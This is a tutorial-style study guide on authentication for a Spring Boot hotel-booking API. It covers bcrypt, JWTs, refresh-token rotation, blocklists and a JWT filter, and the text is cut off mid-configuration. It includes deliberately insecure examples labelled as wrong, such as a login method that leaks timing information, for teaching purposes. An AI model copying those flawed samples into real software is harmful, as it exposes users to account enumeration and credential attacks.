# Auth Study Guide
> A full conversation-based deep dive into Authentication & Authorization, implemented in Java + Spring Boot.

---

## What is "Auth"?

"Auth" covers two distinct concepts that often get conflated:

- **Authentication (AuthN)** — *"Who are you?"* Verifying the identity of a user. Login with email/password, Google OAuth, OTP — these are all authentication.
- **Authorization (AuthZ)** — *"What are you allowed to do?"* Deciding what an authenticated user can access. "Only the booking owner can cancel their booking" — that's authorization.

### Why does miniAgoda need Auth?

Right now the system has no concept of who is making a request. Auth lets you:

- Tie a booking to a user ("my bookings")
- Protect payment/refund endpoints (only the owner or an admin can trigger a refund)
- Support roles — guest, hotel manager, admin


### The Core Flow (Email + Password)
Here's the most fundamental auth flow:

**Register**

```
User sends email + password
→ Hash the password (bcrypt/argon2)
→ Store user in DB
```

**Login**

```
User sends email + password
→ Look up user by email
→ Compare password against stored hash
→ Issue a token (JWT or session)
```

**Authenticated Request**

```
User sends token with every request
→ Server verifies token
→ Attaches user identity to the request
→ Handler logic can now check permissions
```

### The Big Decision: Sessions vs. JWT

| | Sessions | JWT (JSON Web Token) |
|---|---|---|
| State stored | Server-side (DB/Redis) | Client-side (the token itself) |
| Logout | Easy — delete session | Hard — token stays valid until expiry |
| Scalability | Needs shared session store | Stateless, works across servers |
| Revocation | Instant | Requires a blocklist |
| Best for | Traditional web apps | APIs, mobile apps, microservices |

For a hotel booking API like miniAgoda, **JWT** is the common choice — but it has tradeoffs worth understanding.

---

## miniAgoda Auth — Study Roadmap

### Layer 1 — Foundations
> *Concepts that everything else builds on*
1. How passwords should be stored — hashing, salting, bcrypt
2. How HTTP carries identity — cookies vs. headers, stateless vs. stateful
3. What a JWT is — structure, signing, verification, expiry

### Layer 2 — Core Implementation
> *Building the actual auth system*
4. Registration & Login flow — input validation, error handling, security gotchas
5. Refresh tokens — why access tokens expire fast, how rotation works
6. Logout & token revocation — harder than it sounds with JWT

### Layer 3 — Authorization
> *Who can do what*
7. Protecting routes — middleware pattern
8. Resource ownership — "can this user cancel this booking?"
9. Roles & permissions — guest, hotel manager, admin

### Layer 4 — Real World
> *What production systems actually deal with*
10. OAuth / Social login — Login with Google
11. Common attacks & defenses — brute force, CSRF, token theft
12. Fitting Auth into miniAgoda — wiring it into Search, Booking, Payment

---

## Layer 1, Topic 1 — How Passwords Should Be Stored

### The Wrong Way First
Let's say a user registers with the password `sunshine99`. The naive approach:

```
store in DB:  password = "sunshine99"
```

This is **plaintext storage**. If your database is ever leaked — and breaches happen to big companies constantly — every single user's password is immediately exposed. Since people reuse passwords, that also compromises their Gmail, bank, and everything.

### Attempt 2 — Encryption
*"What if we encrypt it?"*

```
store in DB:  password = encrypt("sunshine99", secretKey)
```

Better, but still wrong. Encryption is reversible — if someone gets your secret key, they can decrypt every password. You don't actually need to *reverse* a password. You just need to *verify* it.

This is the key insight that leads to hashing.

### Attempt 3 — Hashing

A hash function is one-way. You can't reverse it.

```
MD5("sunshine99")  →  "a3f2bc..."   ✓ fast to compute
                                     ✗ can't reverse back to "sunshine99"
```

On login, instead of decrypting, you just hash what the user typed and compare.

```
user types:       "sunshine99"
hash it:          "a3f2bc..."
compare to DB:    "a3f2bc..."  ✓ match → logged in
```
Sounds good. But there's a fatal problem.

### The Problem with Plain Hashing — Rainbow Tables

Because `MD5("sunshine99")` always produces the same output, attackers precomputed massive lookup tables of common passwords and their hashes. These are called rainbow tables.

```
"password123"  →  "482c811d..."
"sunshine99"   →  "a3f2bc..."
"iloveyou"     →  "f25a2fc..."
... millions of entries
```

They leak your DB, look up every hash, done. No computing needed.

### The Fix — Salting
A salt is a random string generated per user, added to the password before hashing.

```
salt    =  "xQ7$kL"   (random, unique per user)
hash    =  MD5("sunshine99" + "xQ7$kL")  →  "9f3a1d..."
```

You store both the salt and the hash. On login:

```
user types:   "sunshine99"
fetch salt:   "xQ7$kL"
hash:         MD5("sunshine99" + "xQ7$kL")  →  "9f3a1d..."
compare:      matches ✓
```

Rainbow tables are now useless — they'd need a separate table for every possible salt.


### But MD5 and SHA are Still Wrong — Speed is the Enemy

MD5 and SHA-256 were designed to be fast — millions of hashes per second on modern hardware. For file checksums, great. For passwords, catastrophic.
An attacker with a GPU can try billions of password guesses per second against a stolen hash. Even with a salt, a weak password like `sunshine99` falls in seconds.


### The Right Tool — bcrypt

bcrypt was designed specifically for passwords. It has two key properties:
1. It's intentionally slow
It has a cost factor (also called work factor) that controls how much computation is needed.

```
cost = 10  →  ~100ms per hash
cost = 12  →  ~400ms per hash
cost = 14  →  ~1.5s per hash
```

100ms feels instant to a user logging in. But for an attacker trying a billion guesses — suddenly impossible.
2. The salt is built in
bcrypt generates and stores the salt automatically. The output is self-contained:

```
bcrypt("sunshine99")  →  "$2b$10$xQ7kL...hashed..."
                              ↑    ↑
                           algo  cost factor + salt + hash all in one string
```

You store this single string. On login, bcrypt knows how to extract the salt and re-verify.

### Summary

| Approach | Problem |
|---|---|
| Plaintext | Direct exposure on breach |
| Encryption | Reversible, key can be stolen |
| MD5/SHA hash | Rainbow tables |
| MD5/SHA + salt | Still too fast, brute-forceable |
| **bcrypt + salt** | ✅ Slow by design, salt built-in |

> You never **store** a password. You store a **proof** that someone knew the password.

---

## Layer 1, Topic 2 — How HTTP Carries Identity

### The Core Problem

HTTP is **stateless** by design. Every request is completely independent — the server has no memory of previous requests.

```
Request 1:  "Here's my email and password, log me in"  →  Server: "OK ✓"
Request 2:  "Show me my bookings"                      →  Server: "...who are you?"
```

After login, every subsequent request needs to carry proof of identity.

### Approach 1 — Cookies 🍪

After login, the server sends back a cookie. The browser automatically attaches it to every subsequent request.

```
Login response:
  Set-Cookie: session_id=abc123; HttpOnly; Secure

Every subsequent request browser sends automatically:
  Cookie: session_id=abc123
```

The server looks up `abc123` in its session store (database or Redis) to find out who you are.

```
session store:
  "abc123"  →  { userId: 42, email: "mario@example.com", role: "guest" }
```

This is stateful — the server holds the state.

### Approach 2 — Token in Header

After login, the server issues a token. The client stores it and manually sends it with every request.

```
Login response:
  { "token": "eyJhbGc..." }

Every subsequent request client sends manually:
  Authorization: Bearer eyJhbGc...
```

The server verifies the token itself — no lookup needed. The token contains the identity.
This is stateless — the server holds nothing.

### Stateful vs. Stateless — The Real Difference

```
STATEFUL (Sessions)                    STATELESS (Tokens)

Client          Server                 Client          Server
  |   login       |                     |   login       |
  |─────────────→ |                     |─────────────→ |
  |   session_id  |  stores session     |   token       |  stores nothing
  |←───────────── |  in DB/Redis        |←───────────── |
  |               |                     |               |
  |   session_id  |  looks up session   |   token       |  verifies token
  |─────────────→ |  in DB              |─────────────→ |  mathematically
  |   response    |                     |   response    |
  |←───────────── |                     |←───────────── |
```

### Cookie Properties Worth Knowing

| Flag | What it does |
|---|---|
| `HttpOnly` | JavaScript cannot read this cookie — blocks XSS theft |
| `Secure` | Only sent over HTTPS |
| `SameSite=Strict` | Only sent on same-site requests — blocks CSRF |
| `Max-Age` | How long until it expires |

These flags matter a lot. A cookie without HttpOnly can be stolen by injected JavaScript.

### Where Tokens Are Stored (Client Side)

Since tokens aren't automatically handled by the browser like cookies, the client has to store them somewhere:

| Storage | XSS risk | CSRF risk | Notes |
|---|---|---|---|
| localStorage | ✗ High | ✓ None | JS can read it — malicious scripts can steal it |
| sessionStorage | ✗ High | ✓ None | Same as localStorage, cleared on tab close |
| HttpOnly Cookie | ✓ None | ✗ Needs mitigation | Best of both worlds |
| Memory (JS variable) | ✓ None | ✓ None | Gone on page refresh |

A common pattern for SPAs and mobile apps: store the token in an HttpOnly cookie even though it's a token-based system. You get the security of cookies with the flexibility of tokens.

### Summary

* HTTP is stateless — identity must be re-proved on every request
* Cookies — browser handles automatically, server holds state
* Token in header — client handles manually, server is stateless
* Cookie flags (HttpOnly, Secure, SameSite) are not optional niceties — they're security requirements
* Where you store a token on the client has real security consequences

---

## Layer 1, Topic 3 — What a JWT Is

### One Sentence Definition

A JWT (JSON Web Token) is a **self-contained**, signed package of claims that the server issues and the client presents on every request.
"Self-contained" is the key word. The token is the identity — no database lookup needed.

### What It Looks Like

A JWT looks like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJlbWFpbCI6Im1hcmlvQGV4YW1wbGUuY29tIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzE2MjM5MDIyLCJleHAiOjE3MTYyNDI2MjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Three base64-encoded chunks separated by dots:

```
HEADER . PAYLOAD . SIGNATURE
```

### Chunk 1 — Header

Describes the token itself — what type it is and what algorithm was used to sign it.
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
`HS256` means HMAC + SHA-256. We'll come back to what that means.


### Chunk 2 — Payload

The actual data. These fields are called claims.
```json
{
  "userId": 42,
  "email": "mario@example.com",
  "role": "guest",
  "iat": 1716239022,
  "exp": 1716242622
}
```

| Claim | Meaning |
|---|---|
| `userId` | Your custom data |
| `email` | Your custom data |
| `role` | Your custom data |
| `iat` | *Issued at* — when the token was created (Unix timestamp) |
| `exp` | *Expires at* — when the token dies |

`iat` and `exp` are standard JWT claims. Everything else is yours to define.
Important: the payload is just base64-encoded — not encrypted. Anyone can decode and read it. Never put passwords, card numbers, or secrets in a JWT payload.

### Chunk 3 — Signature

This is what makes the token trustworthy.
```
HMAC-SHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)
```

The server takes the header and payload, runs them through a hashing algorithm using a secret key only the server knows, and appends the result.

```
header.payload  →  signed with SECRET_KEY  →  signature
```

### Why the Signature Matters

Imagine a user decodes their token, changes `"role"`: `"guest"` to `"role"`: `"admin"`, re-encodes it, and sends it.
The server receives it and computes:

```
HMAC-SHA256(tampered_header.tampered_payload, SECRET_KEY)
```

The result won't match the signature that came with the token — because the attacker doesn't have `SECRET_KEY`.

```
expected signature:  "SflKxwRJ..."
received signature:  "zX9mQpLk..."   ✗ REJECTED
```

The payload is **readable by anyone, but modifiable by no one** (without the secret key).

### The Full Lifecycle

```
1. LOGIN
   User sends email + password
   Server verifies credentials
   Server creates payload:  { userId: 42, role: "guest", exp: +1hour }
   Server signs it with SECRET_KEY
   Server returns JWT to client

2. AUTHENTICATED REQUEST
   Client sends:  Authorization: Bearer <jwt>
   Server splits token into header.payload.signature
   Server recomputes signature from header + payload + SECRET_KEY
   If signatures match → payload is trustworthy → user is authenticated
   Server reads userId, role from payload → no DB lookup needed

3. EXPIRY
   Server checks exp claim
   If current time > exp → token rejected, user must log in again
```

### HS256 vs RS256

| | HS256 (Symmetric) | RS256 (Asymmetric) |
|---|---|---|
| Signing key | One secret key | Private key signs, public key verifies |
| Who can verify | Only parties with the secret | Anyone with the public key |
| Best for | Single server / monolith | Microservices, third-party verification |
| Risk | Secret key leak = full compromise | Private key stays on auth server only |

### The Expiry Problem

Short-lived tokens (15 min, 1 hour) are safer — if stolen, they expire quickly. But that means the user gets logged out constantly.
The solution is refresh tokens — which is all of Topic 5. For now, just know:

* Access token — short-lived (15min–1hr), used on every request
* Refresh token — long-lived (days/weeks), used only to get a new access token

---

Summary

* A JWT is three base64 chunks: `header.payload.signature`
* The payload carries claims — userId, role, expiry — readable by anyone
* The signature is a cryptographic proof the payload wasn't tampered with
* The server never stores the token — it just re-verifies the signature on every request
* Short expiry = safer, but needs refresh tokens to stay usable

That completes Layer 1 — Foundations. You now understand:

* ✅ How passwords are safely stored (bcrypt)
* ✅ How HTTP carries identity (cookies vs. tokens)
* ✅ What a JWT is and why it can be trusted

---

## Layer 2, Topic 4 — Registration & Login Flow

### Overview
This is where the theory becomes a real system. Registration and login are the most attacked endpoints in any application — so the details matter a lot.

### Registration Flow

#### The Happy Path

```
Client                          Server
  │                               │
  │  POST /auth/register          │
  │  { email, password }          │
  │─────────────────────────────→ │
  │                               │  1. Validate input
  │                               │  2. Check email not already taken
  │                               │  3. Hash password with bcrypt
  │                               │  4. Store user in DB
  │  201 Created                  │
  │←───────────────────────────── │
```

#### Step 1 — Input Validation

Before touching the database, validate everything:

```
email:
  ✓ present?
  ✓ valid format?
  ✓ max length? (prevent DB overflow attacks)

password:
  ✓ present?
  ✓ minimum length? (8+ chars)
  ✓ maximum length? (72 chars — bcrypt silently truncates beyond this)
```

The 72-char bcrypt limit is a real gotcha. A user sets a 200-char password, feels secure, but bcrypt only hashed the first 72 chars. Most developers don't know this.


#### Step 2 — Check Email Uniqueness

```
SELECT id FROM users WHERE email = $1
```

If found → return error. But how you return it matters.

```
❌  "This email is already registered"
✓   "If this email is available, you'll receive a confirmation"
```

The first response lets attackers enumerate which emails have accounts — useful for targeted attacks or privacy violations. The second reveals nothing. This is called account enumeration protection and is especially important if your users are hotel guests who may want privacy.


#### Step 3 — Hash the Password

```java
String hash = passwordEncoder.encode(password);
// BCryptPasswordEncoder with cost factor 12 = ~400ms
```

Never log the plaintext password anywhere. Not in debug logs, not in error traces.

#### Step 4 — Store in DB

Minimal user record at registration:

```sql
INSERT INTO users (email, password_hash, role, created_at)
VALUES ($1, $2, 'guest', NOW())
```

### Login Flow

#### The Happy Path

```
Client                          Server
  │                               │
  │  POST /auth/login             │
  │  { email, password }          │
  │─────────────────────────────→ │
  │                               │  1. Find user by email
  │                               │  2. Compare password to hash
  │                               │  3. Sign JWT
  │                               │  4. Return token
  │  200 OK                       │
  │  { accessToken, refreshToken }│
  │←───────────────────────────── │
```

#### Step 1 — Find User by Email

```sql
SELECT id, email, password_hash, role FROM users WHERE email = $1
```

If no user found — do not return immediately. This is subtle but critical.

### The Timing Attack Problem

If you return early when a user is not found, attackers can time the response to enumerate valid emails:

```java
// ❌ WRONG — timing leak
User user = userRepository.findByEmail(email);
if (user == null) {
    return error("Invalid credentials"); // fast ~1ms — reveals email doesn't exist
}
boolean match = passwordEncoder.matches(password, user.getPasswordHash());
if (!match) {
    return error("Invalid credentials"); // slow ~400ms — reveals email exists
}
```
An attacker can time the response. Fast response = email doesn't exist. Slow response = email exists, wrong password. You've leaked information through timing alone.
The fix:

```java
// ✅ CORRECT — constant time
User user = userRepository.findByEmail(email);
if (user == null) {
    passwordEncoder.encode(password); // dummy hash to waste time
    return error("Invalid credentials");
}
boolean match = passwordEncoder.matches(password, user.getPasswordHash());
if (!match) {
    return error("Invalid credentials");
}
```

Both paths now take ~400ms. No information leaked.

#### Step 2 — Compare Password

```java
boolean match = BCrypt.checkpw(plaintext, storedHash);
// BCrypt extracts the salt from storedHash automatically
// returns true or false
```

#### Step 3 — Sign the JWT

```java
String accessToken = Jwts.builder()
    .claim("userId", user.getId())
    .claim("email",  user.getEmail())
    .claim("role",   user.getRole())
    .issuedAt(new Date())
    .expiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000))
    .signWith(Keys.hmacShaKeyFor(SECRET_KEY.getBytes()))
    .compact();
```

Keep the payload small. Only what middleware will actually need on every request. Don't stuff in address, phone number, preferences — those can be fetched when needed.

### Error Messages — The Golden Rule

Never tell the user which part was wrong:

```
❌  "No account found with that email"
❌  "Wrong password"
✓   "Invalid email or password"
```

Same message, always, regardless of whether email or password failed. Otherwise attackers can confirm which emails have accounts.

### Brute Force Protection

Login endpoints are hammered constantly. Without protection:

```
attacker tries:
  sunshine1, sunshine2, sunshine3 ... sunshine99  →  ✓ logged in
```

#### Defenses:

| Technique | How it works |
|---|---|
| Rate limiting | Max N attempts per IP per minute |
| Account lockout | Lock account after N failed attempts |
| Exponential backoff | Each failure adds delay |
| CAPTCHA | Trigger after N failures |

---

For miniAgoda, rate limiting per IP + per email is the minimum. Account lockout needs care — it can be abused to lock out legitimate users by deliberately failing their login repeatedly.

#### What the DB Schema Looks Like

```sql
CREATE TABLE users (
  id            SERIAL PRIMARY KEY,
  email         VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  role          VARCHAR(50) DEFAULT 'guest',
  created_at    TIMESTAMP DEFAULT NOW(),
  last_login_at TIMESTAMP
);
```

#### How This Connects to miniAgoda

```
POST /auth/register  →  creates user
POST /auth/login     →  returns { accessToken, refreshToken }

All existing endpoints now need the access token:
  POST /bookings       →  requires auth, ties booking to userId
  POST /payments       →  requires auth, verifies booking owner
  POST /refunds        →  requires auth, verifies booking owner
```

The token middleware sits in front of everything — which is exactly Topic 7: Protecting routes.

#### Summary

* Validate input before touching the DB — including bcrypt's 72-char limit
* Use constant-time comparisons to prevent timing attacks
* Never reveal which credential was wrong
* Hash with bcrypt cost 12, never log plaintext passwords
* Rate limit login endpoints — they will be attacked

---

## Layer 2, Topic 5 — Refresh Tokens

### Why Access Tokens Expire Fast

Recall from Topic 3 — JWTs are stateless. The server stores nothing. That means there's no way to invalidate a token once issued.
Think about what that means:

```
1. User logs in → gets access token (valid 30 days)
2. Day 3: attacker steals the token
3. Attacker has 27 days of free access
4. You can't stop them — server holds no state to revoke
```

The defense is to make access tokens short-lived. If stolen, the damage window is small.

```
access token expires in 15 minutes
→ attacker steals it at minute 1
→ dead in 14 minutes
```

But then legitimate users get logged out every 15 minutes. That's terrible UX.
**Refresh tokens solve this tension.**

### The Two-Token System

```
ACCESS TOKEN
  Purpose:    Prove identity on every API request
  Lifespan:   Short  — 15 minutes to 1 hour
  Stored:     Client memory or HttpOnly cookie
  Sent:       Every request

REFRESH TOKEN
  Purpose:    Get a new access token when it expires
  Lifespan:   Long  — 7 days to 30 days
  Stored:     HttpOnly cookie
  Sent:       Only to /auth/refresh endpoint
```

They work together like a key card and a master key:

* Key card (access token) — used constantly, short-lived, low damage if lost
* Master key (refresh token) — stored safely, used rarely, gets you a new key card

### The Full Flow

```
1. LOGIN
   Client sends email + password
   Server returns:
     accessToken  (expires 15min)
     refreshToken (expires 7days)

2. NORMAL REQUESTS (first 15 minutes)
   Client sends accessToken
   Server verifies → responds normally

3. ACCESS TOKEN EXPIRES
   Client sends accessToken
   Server returns 401 Unauthorized

4. SILENT REFRESH
   Client (automatically) sends refreshToken to POST /auth/refresh
   Server verifies refreshToken → returns NEW accessToken (+ new refreshToken)
   Client retries the original request — user notices nothing

5. REFRESH TOKEN EXPIRES (after 7 days)
   Server rejects refresh request
   Client redirects user to login
```

From the user's perspective: they log in once, stay logged in for 7 days, and are only asked to log in again after a week of inactivity.

### How Refresh Tokens Are Stored Server-Side

Unlike access tokens, refresh tokens are stored in the database. This is what makes them revocable.

```sql
CREATE TABLE refresh_tokens (
  id          SERIAL PRIMARY KEY,
  user_id     INT REFERENCES users(id),
  token_hash  VARCHAR(255) NOT NULL,  -- store hash, not plaintext
  expires_at  TIMESTAMP NOT NULL,
  revoked     BOOLEAN DEFAULT FALSE,
  created_at  TIMESTAMP DEFAULT NOW()
);
```

Note: you store the hash of the refresh token, not the token itself — same principle as passwords. If your DB leaks, raw refresh tokens aren't exposed.

### Token Rotation

Every time a refresh token is used, it should be replaced with a new one. This is called rotation.

```
Client uses refreshToken_A  →  POST /auth/refresh
Server:
  1. Look up refreshToken_A in DB
  2. Verify it's valid, not revoked, not expired
  3. Mark refreshToken_A as REVOKED
  4. Issue refreshToken_B + new accessToken
  5. Return both to client
```

Why rotate? If an attacker steals a refresh token:

* Without rotation: attacker uses it indefinitely
* With rotation: legitimate user uses it first → token rotated → attacker's copy is now revoked

### Refresh Token Reuse Detection

This is the sophisticated part. With rotation, you can detect theft:

```
Normal flow:
  User has refreshToken_B (A was already rotated out)
  User uses refreshToken_B → gets refreshToken_C ✓

Theft scenario:
  Attacker stole refreshToken_A before rotation
  User already rotated: A → B → C
  Attacker now tries refreshToken_A

  Server sees: refreshToken_A was already used and revoked
  This means: either a bug, or the token was stolen and reused

  Server response: REVOKE THE ENTIRE FAMILY
  → invalidate refreshToken_B and refreshToken_C too
  → force user to log in again
```

This is called **refresh token family** tracking. A detected reuse is a signal of compromise — so the safe response is to log everyone out and make the real user re-authenticate.

#### What the Refresh Endpoint Looks Like

```
POST /auth/refresh
Body or Cookie: { refreshToken }

Server:
  1. Hash the incoming token
  2. Look up hash in DB
  3. Check: exists? not revoked? not expired? user still active?
  4. If any check fails → 401, revoke family if reuse detected
  5. If all pass → issue new accessToken + rotate refreshToken
  6. Return new tokens
```

### Where to Store Tokens on the Client

This is a real debate. The safest approach:

```
accessToken   →  JavaScript memory (variable)
                 Gone on page refresh, but that's fine — refresh token gets a new one

refreshToken  →  HttpOnly cookie
                 JavaScript can't touch it
                 Automatically sent to /auth/refresh
                 Protected from XSS
```

This setup means:

* XSS attack can't steal either token (access is in memory, refresh is HttpOnly)
* CSRF can't use the refresh token meaningfully (it only produces a new token, doesn't take action)

### Connecting to miniAgoda

```
POST /auth/login
  → returns accessToken (15min) + refreshToken (7 days)

POST /auth/refresh
  → validates refreshToken, returns new accessToken

All booking/payment/refund endpoints:
  → only check accessToken
  → never see refresh tokens
```

The client handles the refresh cycle invisibly. User books a hotel, their token expires mid-session, client silently refreshes, booking completes — they never knew.

#### Summary

* Access tokens are short-lived to limit theft damage — but that forces refresh tokens for UX
* Refresh tokens are long-lived, stored in DB, and therefore revocable
* Rotation — every use issues a new refresh token, old one revoked
* Reuse detection — using an already-rotated token signals theft, triggers full logout
* Store refresh token in HttpOnly cookie, access token in memory

---

## Layer 2, Topic 6 — Logout & Token Revocation

### Why Logout is Harder Than It Seems

With sessions, logout is trivial:
```sql
DELETE FROM sessions WHERE id = $1
-- done. token is dead instantly.
```

With JWT, the server holds no state. So when the user clicks logout:

```
Client deletes token from memory/cookie
Server: ...
Server: (nothing, server doesn't know or care)
```

The token still cryptographically valid until it expires. If the client had already sent it somewhere, or an attacker copied it, it keeps working.
This is the fundamental tension of stateless auth — and logout forces you to resolve it.

### What "Logout" Actually Means

There are three distinct things logout needs to accomplish:

```
1. Client-side cleanup
   Delete accessToken from memory
   Delete refreshToken from cookie/storage

2. Refresh token revocation
   Mark refreshToken as revoked in DB
   Attacker can't use it to get new access tokens

3. Access token invalidation
   The hard part — access token is stateless, still valid until exp
```

Steps 1 and 2 are straightforward. Step 3 is the real problem.

#### The Access Token Problem

After logout, the access token lives on:

```
token issued at:  10:00am
user logs out:    10:05am
token expires:    10:15am

window of danger: 10:05am → 10:15am (10 minutes)
```

For most applications, this is an acceptable tradeoff. Short expiry (15min) means the window is small. This is why access token lifetime is a security decision, not just a UX one.
But sometimes 15 minutes is too long. A banking app, a healthcare system, a hotel admin portal — these may need instant revocation.

### Solution — The Token Blocklist

When instant revocation is required, you maintain a blocklist:

```
On logout:
  Store the access token's jti (JWT ID) in a blocklist
  Set TTL = remaining token lifetime (auto-cleanup)

On every request:
  Verify JWT signature  ✓
  Check jti NOT in blocklist  ✓
  If in blocklist → 401
```

`jti` is a standard JWT claim — a unique ID per token:

```java
String accessToken = Jwts.builder()
    .claim("userId", user.getId())
    .claim("role",   user.getRole())
    .id(UUID.randomUUID().toString())   // sets jti claim
    .issuedAt(new Date())
    .expiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000))
    .signWith(Keys.hmacShaKeyFor(SECRET_KEY.getBytes()))
    .compact();
```

The blocklist is typically stored in Redis — fast in-memory lookups, automatic TTL expiry, doesn't pollute your main DB.

```
Redis blocklist:
  "jti:3f9a2c..."  →  "1"   (TTL: 14 minutes remaining)
  "jti:7d1e4b..."  →  "1"   (TTL: 3 minutes remaining)
```

When tokens expire, Redis auto-deletes them. The blocklist stays small.

### The Tradeoff Spectrum

```
FULLY STATELESS                              FULLY STATEFUL
     |────────────────────────────────────────────|
  No blocklist                            Full blocklist
  No revocation                           Instant revocation
  Fastest performance                     DB/Redis hit every request
  Acceptable for most apps                Required for high-security apps
```

miniAgoda sits somewhere in the middle. Hotel booking isn't a bank, but admin and payment endpoints deserve tighter control. A reasonable approach:

```
Regular guest endpoints  →  no blocklist, short expiry is fine
Admin / payment endpoints  →  check blocklist on every request
```

### Types of Logout

Not all logouts are equal. You need to handle several scenarios:

**1. Regular logout — single device**

```
Revoke current refreshToken
Add current accessToken jti to blocklist (if using one)
Clear client storage
```

**2. Logout all devices**

```
Revoke ALL refresh tokens for this user
Add ALL active access tokens to blocklist (you need to track jtis per user)
User must log in again on every device
```

**3. Forced logout — admin action**

```
Admin flags user account as suspended
All tokens rejected regardless of validity
Requires either blocklist or account status check on every request
```

**4. Password change**

```
Should trigger logout of all other devices
Old tokens are potentially in attacker's hands
Revoke all refresh tokens, blocklist all access tokens
```

#### Account Status Check — Lightweight Alternative

Instead of (or alongside) a full blocklist, you can add a single DB check:

```java
// In auth filter, after JWT verification:
User user = userRepository.findById(payload.getUserId()).orElse(null);
if (user == null || user.isSuspended()) {
    response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
    return;
}
```

This catches forced logouts and suspensions with one query. The downside — it's a DB hit on every request, which partially defeats stateless JWT's performance benefit.
A common compromise: cache the user status in Redis with a short TTL (1 minute). Fast lookup, near-instant revocation with at most 1 minute lag.

### Putting It All Together — Logout Endpoint

```
POST /auth/logout

Server:
  1. Verify accessToken (must be valid to logout)
  2. Extract jti from accessToken
  3. Add jti to Redis blocklist (TTL = remaining token lifetime)
  4. Hash incoming refreshToken
  5. Mark refreshToken as revoked in DB
  6. Return 200

Client:
  1. Delete accessToken from memory
  2. Delete refreshToken cookie
  3. Redirect to login page
```

### Summary Table — Revocation Approaches

| Approach | Revocation speed | Performance cost | Complexity |
|---|---|---|---|
| Short expiry only | At expiry (minutes) | None | Low |
| Refresh token revocation | Stops new access tokens | Low | Low |
| Redis blocklist (jti) | Instant | Small (Redis lookup) | Medium |
| DB user status check | ~instant | Medium | Low |
| Full session store | Instant | Medium | Low |

#### Summary

* Deleting a token client-side doesn't invalidate it — it's still cryptographically valid
* Revoking the refresh token stops new access tokens but doesn't kill the current one
* A Redis blocklist with jti gives instant revocation with minimal performance cost
* Password changes and admin suspensions should trigger full revocation across all devices
* Short access token expiry is your first line of defense — reduce the revocation window

That completes Layer 2 — Core Implementation. You now understand:

* ✅ Registration & Login (with timing attacks, enumeration, brute force)
* ✅ Refresh tokens (rotation, reuse detection)
* ✅ Logout & revocation (the stateless JWT problem and its solutions)

---

## Layer 3, Topic 7 — Protecting Routes with Middleware

In Spring Boot, the "middleware" concept maps to two things — a **JWT** filter that runs on every request, and **Security configuration** that defines which routes need protection.

### The Big Picture

```
Incoming Request
      │
      ▼
┌─────────────────────┐
│   JwtAuthFilter     │  ← runs before every request
│  1. Extract token   │
│  2. Verify token    │
│  3. Set SecurityCtx │
└─────────┬───────────┘
          │
          ▼
┌─────────────────────┐
│  Security Config    │  ← decides: is this route allowed?
│  /auth/**  → public │
│  /bookings → auth   │
│  /admin/** → admin  │
└─────────┬───────────┘
          │
          ▼
   Controller Method
```

### Step 1 — The JWT Utility Class

Handles signing, verifying, and extracting claims from tokens.

```java
@Component
public class JwtUtil {

    @Value("${jwt.secret}")
    private String secretKey;

    @Value("${jwt.access-token-expiry}")
    private long accessTokenExpiry;

    public String generateAccessToken(User user) {
        return Jwts.builder()
            .subject(String.valueOf(user.getId()))
            .claim("email", user.getEmail())
            .claim("role",  user.getRole())
            .claim("jti",   UUID.randomUUID().toString())
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + accessTokenExpiry))
            .signWith(getSigningKey())
            .compact();
    }

    public Claims extractAllClaims(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    public String extractUserId(String token) {
        return extractAllClaims(token).getSubject();
    }

    public String extractJti(String token) {
        return extractAllClaims(token).get("jti", String.class);
    }

    public boolean isTokenValid(String token) {
        try {
            extractAllClaims(token);
            return true;
        } catch (JwtException e) {
            return false;
        }
    }

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secretKey);
        return Keys.hmacShaKeyFor(keyBytes);
    }
}
```

### Step 2 — The JWT Filter

Runs on every request. Extracts the token, verifies it, and loads the user identity into Spring's `SecurityContext`.

```java
@Component
@RequiredArgsConstructor
public class JwtAuthFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final UserDetailsService userDetailsService;
    private final TokenBlocklistService blocklistService;

    @Override
    protected void doFilterInternal(
            HttpServletRequest  request,
            HttpServletResponse response,
            FilterChain         filterChain
    ) throws ServletException, IOException {

        String token = extractToken(request);

        if (token == null) {
            filterChain.doFilter(request, response);
            return;
        }

        if (!jwtUtil.isTokenValid(token)) {
            filterChain.doFilter(request, response);
            return;
        }

        String jti = jwtUtil.extractJti(token);
        if (blocklistService.isBlocked(jti)) {
            filterChain.doFilter(request, response);
            return;
        }

        String userId = jwtUtil.extractUserId(token);
        UserDetails userDetails = userDetailsService.loadUserByUsername(userId);

        UsernamePasswordAuthenticationToken authToken =
            new UsernamePasswordAuthenticationToken(
                userDetails,
                null,
                userDetails.getAuthorities()
            );

        authToken.setDetails(
            new WebAuthenticationDetailsSource().buildDetails(request)
        );

        SecurityContextHolder.getContext().setAuthentication(authToken);
        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            return header.substring(7);
        }
        return null;
    }
}
```

### Step 3 — Security Configuration

Defines which routes are public and which require authentication or specific roles.

```java
@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthFilter jwtAuthFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers(
                    "/auth/register",
                    "/auth/login",
                    "/auth/refresh"
                ).permitAll()
                .requestMatchers(HttpMethod.GET, "/hotels/**").permitAll()
                .requestMatchers("/bookings/**").authenticated()
                .requestMatchers("/payments/**").authenticated()
